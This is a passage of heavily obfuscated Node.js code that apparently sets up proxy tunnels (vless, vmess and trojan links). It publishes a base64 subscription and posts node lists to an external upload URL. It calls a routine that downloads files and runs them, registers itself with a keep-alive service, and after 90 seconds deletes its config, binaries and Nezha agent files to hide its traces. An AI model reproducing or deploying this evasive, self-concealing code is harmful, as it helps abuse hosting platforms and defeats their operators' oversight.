_0x3e1fd5={_0x3aad46:0x110,_0x2f43ff:0x12b,_0x2e5d64:0x17d,_0xe10f15:0x1c4,_0x291fee:0x19c,_0x5bda5c:0x1c3,_0xbf5110:0x120,_0x4c874d:0x12b,_0x325c74:0x16f,_0x64d816:0x161,_0x9a76ab:0x1c3,_0x12cae0:0x189,_0x18fb81:0x108,_0x254f90:0x164},_0x593ffd=await _0x2c88ae(),_0x3a48e0=NAME?NAME+'-'+_0x593ffd:_0x593ffd;return new Promise(_0x3dd8b7=>{const _0x150076={_0x55a492:0x161,_0x45bd46:0x119};setTimeout(()=>{const _0x1f84aa=_0x2cb6,_0x506c6a={'v':'2','ps':''+_0x3a48e0,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x1f84aa(_0x3e1fd5._0x3aad46),'host':_0x4a2d04,'path':_0x1f84aa(0x152),'tls':_0x1f84aa(0x14a),'sni':_0x4a2d04,'alpn':'','fp':_0x1f84aa(0x130)},_0x38e07b=_0x1f84aa(0x16e)+UUID+'@'+CFIP+':'+CFPORT+_0x1f84aa(0x125)+_0x4a2d04+_0x1f84aa(_0x3e1fd5._0x2f43ff)+_0x4a2d04+_0x1f84aa(_0x3e1fd5._0x2e5d64)+_0x3a48e0+'\x0a\x0avmess://'+Buffer[_0x1f84aa(0x161)](JSON[_0x1f84aa(_0x3e1fd5._0xe10f15)](_0x506c6a))[_0x1f84aa(_0x3e1fd5._0x291fee)](_0x1f84aa(_0x3e1fd5._0x5bda5c))+_0x1f84aa(0x1b7)+UUID+'@'+CFIP+':'+CFPORT+_0x1f84aa(_0x3e1fd5._0xbf5110)+_0x4a2d04+_0x1f84aa(_0x3e1fd5._0x4c874d)+_0x4a2d04+_0x1f84aa(_0x3e1fd5._0x325c74)+_0x3a48e0+_0x1f84aa(0x1c7);console['log'](Buffer[_0x1f84aa(_0x3e1fd5._0x64d816)](_0x38e07b)[_0x1f84aa(0x19c)](_0x1f84aa(_0x3e1fd5._0x9a76ab))),fs[_0x1f84aa(_0x3e1fd5._0x12cae0)](subPath,Buffer[_0x1f84aa(_0x3e1fd5._0x64d816)](_0x38e07b)[_0x1f84aa(0x19c)]('base64')),console['log'](FILE_PATH+_0x1f84aa(_0x3e1fd5._0x18fb81)),uploadNodes(),app[_0x1f84aa(_0x3e1fd5._0x254f90)]('/'+SUB_PATH,(_0xed1a1b,_0x5e8955)=>{const _0xa69c07=_0x1f84aa,_0x150720=Buffer[_0xa69c07(_0x150076._0x55a492)](_0x38e07b)[_0xa69c07(0x19c)](_0xa69c07(0x1c3));_0x5e8955['set'](_0xa69c07(0x1bb),'text/plain;\x20charset=utf-8'),_0x5e8955[_0xa69c07(_0x150076._0x45bd46)](_0x150720);}),_0x3dd8b7(_0x38e07b);},0x7d0);});}}async function uploadNodes(){const _0x1090ea={_0x15c1fe:0x177,_0x81f172:0x157,_0x33ccb4:0x1a0,_0x113f93:0x1a0,_0x28aadb:0x187,_0x3f48c5:0x159,_0x2070cb:0x14e,_0x2ce3af:0x179,_0x5b62e4:0x1c4,_0x4053e6:0x1a3},_0x415749=_0x125a72;if(UPLOAD_URL&&PROJECT_URL){const _0x237d59=PROJECT_URL+'/'+SUB_PATH,_0x53292c={'subscription':[_0x237d59]};try{const _0x3bdc91=await axios[_0x415749(_0x1090ea._0x15c1fe)](UPLOAD_URL+_0x415749(0x174),_0x53292c,{'headers':{'Content-Type':'application/json'}});return _0x3bdc91&&_0x3bdc91['status']===0xc8?(console[_0x415749(0x168)](_0x415749(_0x1090ea._0x81f172)),_0x3bdc91):null;}catch(_0x4823f2){if(_0x4823f2[_0x415749(_0x1090ea._0x33ccb4)]){if(_0x4823f2[_0x415749(_0x1090ea._0x113f93)][_0x415749(_0x1090ea._0x28aadb)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x31e5a9=fs['readFileSync'](listPath,_0x415749(_0x1090ea._0x3f48c5)),_0x25f235=_0x31e5a9[_0x415749(0x147)]('\x0a')[_0x415749(_0x1090ea._0x2070cb)](_0x278254=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x415749(0x101)](_0x278254));if(_0x25f235[_0x415749(_0x1090ea._0x2ce3af)]===0x0)return;const _0x4ea340=JSON[_0x415749(_0x1090ea._0x5b62e4)]({'nodes':_0x25f235});try{const _0x1b3cf4=await axios[_0x415749(_0x1090ea._0x15c1fe)](UPLOAD_URL+_0x415749(_0x1090ea._0x4053e6),_0x4ea340,{'headers':{'Content-Type':'application/json'}});return _0x1b3cf4&&_0x1b3cf4[_0x415749(0x187)]===0xc8?(console[_0x415749(0x168)](_0x415749(0x195)),_0x1b3cf4):null;}catch(_0x48d6c1){return null;}}else return;}}function cleanFiles(){const _0x51f0f8={_0x3ee2e4:0x19a,_0x54cf43:0x16c,_0x335b30:0x10d},_0x497994={_0x261537:0x168,_0x3c4d92:0x117};setTimeout(()=>{const _0x5a6ed1={_0x525d70:0x168},_0x3ad26d=_0x2cb6,_0x236f70=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x236f70[_0x3ad26d(0x11c)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x236f70['push'](phpPath);process[_0x3ad26d(0x163)]===_0x3ad26d(_0x51f0f8._0x3ee2e4)?exec(_0x3ad26d(0x18c)+_0x236f70['join']('\x20')+'\x20>\x20nul\x202>&1',_0x427949=>{const _0x40c52e=_0x3ad26d;console[_0x40c52e(0x192)](),console[_0x40c52e(_0x497994._0x261537)](_0x40c52e(0x1b3)),console['log'](_0x40c52e(_0x497994._0x3c4d92));}):exec(_0x3ad26d(_0x51f0f8._0x54cf43)+_0x236f70['join']('\x20')+_0x3ad26d(_0x51f0f8._0x335b30),_0xc9120c=>{const _0x59ea17=_0x3ad26d;console[_0x59ea17(0x192)](),console['log']('App\x20is\x20running'),console[_0x59ea17(_0x5a6ed1._0x525d70)](_0x59ea17(0x117));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5f0bde={_0x406ea8:0x177,_0x3dfc32:0x1bf,_0x44f155:0x10e},_0x2d4b37=_0x125a72;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2d4b37(0x168)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x361204=await axios[_0x2d4b37(_0x5f0bde._0x406ea8)](_0x2d4b37(0x13e),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2d4b37(_0x5f0bde._0x3dfc32)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x361204;}catch(_0x6553c2){return console['error'](_0x2d4b37(0x129)+_0x6553c2[_0x2d4b37(_0x5f0bde._0x44f155)]),null;}}function _0x2cb6(_0xb2f7d5,_0x492d82){const _0x26e015=_0x26e0();return _0x2cb6=function(_0x2cb6d0,_0x4ce7cc){_0x2cb6d0=_0x2cb6d0-0x101;let _0x70fbc8=_0x26e015[_0x2cb6d0];return _0x70fbc8;},_0x2cb6(_0xb2f7d5,_0x492d82);}async function startserver(){const _0x43c0f9={_0x3f6829:0x1b0,_0x409930:0x1be},_0x5b9d25=_0x125a72;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1d1da8){console[_0x5b9d25(_0x43c0f9._0x3f6829)](_0x5b9d25(_0x43c0f9._0x409930),_0x1d1da8);}}startserver()[_0x125a72(0x17f)](_0x11fd9b=>{const _0x1da99e=_0x125a72;console[_0x1da99e(0x1b0)](_0x1da99e(0x150),_0x11fd9b);}),app[_0x125a72(0x146)](PORT,()=>console['log'](_0x125a72(0x122)+PORT+'!'));
